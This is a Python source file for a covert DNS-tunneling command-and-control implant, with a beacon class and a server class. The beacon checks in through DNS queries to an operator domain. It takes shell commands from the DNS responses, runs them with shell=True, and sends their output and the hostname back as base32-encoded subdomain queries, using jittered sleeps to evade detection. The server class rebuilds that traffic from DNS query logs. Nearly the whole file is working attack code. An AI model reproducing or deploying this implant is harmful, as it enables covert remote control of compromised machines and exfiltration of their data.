"""DNS Beacon — covert C2 channel via DNS tunneling.

Supports A/AAAA/TXT record tunneling. The beacon encodes commands and results
as DNS subdomain queries. The server reconstructs data from DNS query logs.

Transport modes:
    A       — Commands in A-record response IP addresses.
    TXT     — Commands in TXT record responses.
    AAAA    — Commands in AAAA-record responses.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import subprocess
import time
import uuid
from datetime import datetime, timezone


class DNSBeacon:
    """DNS tunneling beacon client.

    Encodes heartbeats and command output as subdomain queries.
    Decodes DNS response data as commands.

    Args:
        domain: DNS domain controlled by the operator.
        dns_server: Resolver to use (default: system resolver).
        sleep_seconds: Interval between check-ins.
        jitter_percent: Random jitter percentage applied to sleep.
        dns_type: DNS record type (A, TXT, AAAA).
        encode_method: Encoding for data (base32, base64, hex).
    """

    def __init__(
        self,
        domain: str,
        dns_server: str | None = None,
        sleep_seconds: int = 5,
        jitter_percent: int = 30,
        dns_type: str = "A",
        encode_method: str = "base32",
    ):
        self.domain = domain.rstrip(".")
        self.dns_server = dns_server
        self.sleep_seconds = sleep_seconds
        self.jitter_percent = jitter_percent
        self.dns_type = dns_type.upper()
        self.encode_method = encode_method
        self.beacon_id = uuid.uuid4().hex[:12]
        self.hostname = os.uname().nodename
        self._ensure_dnspython()

    def _ensure_dnspython(self):
        try:
            import dns.resolver
        except ImportError:
            subprocess.check_call(["pip3", "install", "dnspython", "-q"])
            import dns.resolver

    def _encode(self, data: bytes) -> str:
        if self.encode_method == "base32":
            return base64.b32encode(data).decode().rstrip("=").lower()
        elif self.encode_method == "base64":
            return base64.b64encode(data).decode().rstrip("=")
        return data.hex()

    def _decode(self, data: str) -> bytes:
        padding = "=" * ((8 - len(data) % 8) % 8)
        if self.encode_method == "base32":
            return base64.b32decode(data.upper() + padding)
        elif self.encode_method == "base64":
            return base64.b64decode(data + padding)
        return bytes.fromhex(data)

    def _jittered_sleep(self):
        import random
        jitter = self.sleep_seconds * (random.random() * self.jitter_percent / 100.0)
        time.sleep(self.sleep_seconds + jitter)

    def _dns_query(self, name: str, qtype: str = "A") -> list[str]:
        import dns.resolver
        resolver = dns.resolver.Resolver()
        if self.dns_server:
            resolver.nameservers = [self.dns_server]
        try:
            answers = resolver.resolve(name, qtype, lifetime=5)
            return [str(r) for r in answers]
        except Exception:
            return []

    def _build_query(self, msg_type: str, payload: bytes) -> str:
        ts = int(time.time())
        encoded = self._encode(payload)
        chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
        marker = f"{msg_type}.{self.beacon_id}.{ts}"
        if chunks:
            return f"{marker}.{len(chunks)}.{chunks[0]}.{self.domain}"
        return f"{marker}.0..{self.domain}"

    def check_in(self) -> str | None:
        """Send heartbeat and check for pending commands.

        Returns:
            Command string if one is queued, or None.
        """
        import dns.resolver
        resolver = dns.resolver.Resolver()
        if self.dns_server:
            resolver.nameservers = [self.dns_server]

        beacon_query = f"hb.{self.beacon_id}.{int(time.time())}.{self.hostname}.{self.domain}"
        try:
            if self.dns_type == "TXT":
                answers = resolver.resolve(beacon_query, "TXT", lifetime=5)
                txt_parts = []
                for ans in answers:
                    txt_parts.append("".join(s.decode() for s in ans.strings))
                payload = "".join(txt_parts)
            else:
                answers = resolver.resolve(beacon_query, self.dns_type, lifetime=5)
                payload = "".join(str(r).replace(".", "") for r in answers)

            if payload and payload != "0000":
                return self._decode(payload).decode("utf-8", errors="replace")
        except Exception:
            pass
        return None

    def send_result(self, command: str, output: str, exit_code: int = 0):
        """Send command output via DNS TXT queries.

        Args:
            command: The executed command.
            output: Command stdout/stderr.
            exit_code: Process exit code.
        """
        import dns.resolver
        resolver = dns.resolver.Resolver()
        if self.dns_server:
            resolver.nameservers = [self.dns_server]

        result_data = json.dumps({
            "beacon_id": self.beacon_id,
            "command": command,
            "output": output[:2048],
            "exit_code": exit_code,
            "hostname": self.hostname,
        }).encode()

        encoded = self._encode(result_data)
        chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
        for idx, chunk in enumerate(chunks):
            query = f"rx.{self.beacon_id}.{idx:04d}.{len(chunks):04d}.{chunk}.{self.domain}"
            if len(query) > 253:
                continue
            try:
                resolver.resolve(query, self.dns_type, lifetime=3)
            except Exception:
                pass
            time.sleep(0.05)

    def run(self):
        """Main beacon loop: check-in -> execute command -> send result -> sleep."""
        print(f"DNS Beacon {self.beacon_id} starting on {self.hostname}")
        print(f"Domain: {self.domain}, Type: {self.dns_type}, Sleep: {self.sleep_seconds}s")

        while True:
            try:
                command = self.check_in()
                if command and command.strip():
                    print(f"Executing: {command}")
                    proc = subprocess.run(
                        command, shell=True, capture_output=True, text=True, timeout=60,
                    )
                    output = proc.stdout + proc.stderr
                    self.send_result(command, output, proc.returncode)
                self._jittered_sleep()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(self.sleep_seconds)


class DNSC2Server:
    """DNS C2 server for receiving beacon data from DNS query logs.

    Monitors DNS query logs and reconstructs beacon traffic.
    Supports log sources: file, tcpdump pipe, stdin.

    Args:
        domain: DNS domain controlled by the operator.
        log_source: Path to DNS query log file, or 'tcpdump' for live capture.
        interface: Network interface for tcpdump capture mode.
    """

    def __init__(
        self,
        domain: str,
        log_source: str = "",
        interface: str = "eth0",
    ):
        self.domain = domain.rstrip(".")
        self.log_source = log_source
        self.interface = interface
        self.beacons: dict[str, dict] = {}
        self.pending_commands: dict[str, str] = {}
        self.received_results: dict[str, list[dict]] = {}
        self._partial_chunks: dict[str, dict[int, str]] = {}

    def register_beacon(self, beacon_id: str, hostname: str):
        """Register a new DNS beacon."""
        self.beacons[beacon_id] = {
            "beacon_id": beacon_id,
            "hostname": hostname,
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "checkins": 1,
            "transport": "dns",
        }

    def list_beacons(self) -> list[dict]:
        """List all registered DNS beacons."""
        return list(self.beacons.values())

    def send_task(self, beacon_id: str, command: str):
        """Queue a command for a DNS beacon.

        Args:
            beacon_id: Beacon identifier.
            command: Shell command to execute.
        """
        self.pending_commands[beacon_id] = command

    def process_query_log(self, line: str):
        """Process a single DNS query log line and extract beacon data.

        Supports standard syslog and BIND query log formats.

        Args:
            line: Raw DNS query log line.
        """
        if self.domain not in line:
            return

        parts = line.strip().split()
        query_part = ""
        for part in parts:
            if self.domain in part:
                query_part = part
                break

        if not query_part:
            return

        labels = query_part.lower().split(".")
        domain_idx = labels.index(self.domain.lstrip(".")) if self.domain.lstrip(".") in labels else -1
        if domain_idx < 4:
            return

        msg_type = labels[0].lower()

        if msg_type == "hb":
            beacon_id = labels[1] if len(labels) > 1 else ""
            ts = labels[2] if len(labels) > 2 else ""
            hostname = labels[3] if len(labels) > 3 else ""
            if beacon_id:
                if beacon_id not in self.beacons:
                    self.register_beacon(beacon_id, hostname)
                else:
                    self.beacons[beacon_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
                    self.beacons[beacon_id]["checkins"] += 1
                if beacon_id in self.pending_commands:
                    cmd = self.pending_commands.pop(beacon_id)
                    b32 = base64.b32encode(cmd.encode()).decode().rstrip("=").lower()
                    self._pending_responses[beacon_id] = b32

        elif msg_type == "rx":
            self._handle_result(labels, query_part)

    def _handle_result(self, labels: list[str], query: str):
        beacon_id = labels[1] if len(labels) > 1 else ""
        try:
            chunk_idx = int(labels[2])
            total = int(labels[3])
        except (ValueError, IndexError):
            return

        chunk_data = ""
        for label in labels[4:]:
            if label in (self.domain, self.domain.lstrip(".")):
                break
            chunk_data += label

        if beacon_id not in self._partial_chunks:
            self._partial_chunks[beacon_id] = {}

        self._partial_chunks[beacon_id][chunk_idx] = chunk_data

        if len(self._partial_chunks[beacon_id]) >= total:
            ordered = [self._partial_chunks[beacon_id][i] for i in sorted(self._partial_chunks[beacon_id].keys())]
            encoded = "".join(ordered)
            try:
                padding = "=" * ((8 - len(encoded) % 8) % 8)
                data = base64.b32decode(encoded.upper() + padding)
                result = json.loads(data.decode("utf-8", errors="replace"))
                if beacon_id not in self.received_results:
                    self.received_results[beacon_id] = []
                self.received_results[beacon_id].append(result)
            except Exception:
                pass
            del self._partial_chunks[beacon_id]

    def get_results(self, beacon_id: str) -> list[dict]:
        """Get received results for a beacon.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            List of result dictionaries.
        """
        return self.received_results.get(beacon_id, [])

    _pending_responses: dict[str, str] = {}


__all__ = ["DNSBeacon", "DNSC2Server"]
